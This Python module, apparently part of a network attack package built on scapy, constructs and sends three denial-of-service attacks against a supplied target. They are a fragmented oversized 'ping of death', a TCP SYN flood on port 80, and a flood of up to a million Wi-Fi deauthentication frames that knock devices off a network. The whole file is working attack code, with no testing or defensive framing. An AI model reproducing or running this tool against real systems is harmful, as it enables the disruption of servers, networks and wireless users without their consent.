from .constants import Packets
from .error import PYNETSYS

ERROR = PYNETSYS

def packet(target: str, attack: Packets):
    # IMPORT
    from scapy.layers.inet import fragment, IP, ICMP, TCP, RandShort
    from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

    # CREATING PACKET
    if attack == Packets.DEATH_PING:
        PACKET = fragment(IP(dst = target)/ICMP()/("X"*60000))
        id = Packets.DEATH_PING.encode("ascii")
    elif attack == Packets.SYN_FLOOD:
        PACKET = IP(dst = target, id = 1111, ttl = 99)/TCP(sport = RandShort(), dport = [80], seq = 12345, ack = 1000, window = 1000, flags = "S")
        id = Packets.SYN_FLOOD.encode("ascii")
    elif attack == Packets.WIRELESS_DEAUTH:
        PACKET = RadioTap()/Dot11(type = 0, subtype = 12, addr1 = "ff:ff:ff:ff:ff:ff",  addr2 = target, addr3 = target, SC = 0)/Dot11Deauth()
        id = Packets.WIRELESS_DEAUTH.encode("ascii")
    else:
        raise ERROR("Attack type not exists.")

    # RETURN
    return PACKET, id

def start(packet, id: bytes, _verbose = 1):
    # IMPORT
    import sys
    from scapy.all import send, srloop, sendp
     
    # RUN
    if id.decode("ascii") == Packets.DEATH_PING:
        send(packet, verbose = _verbose)
    elif id.decode("ascii") == Packets.SYN_FLOOD:
        answered, unanswered = srloop(packet, inter = 0.3, retry = 2, timeout = 4, verbose = _verbose)
    elif id.decode("ascii") == Packets.WIRELESS_DEAUTH:
        if sys.platform == "win32":
            sendp(packet, inter = 0.2, count = 1000000, verbose = _verbose)
        sendp(packet, inter = 0.2, count = 1000000, verbose = _verbose, interface = "wlan0mon")
    else:
        raise ERROR("ID not exists.")
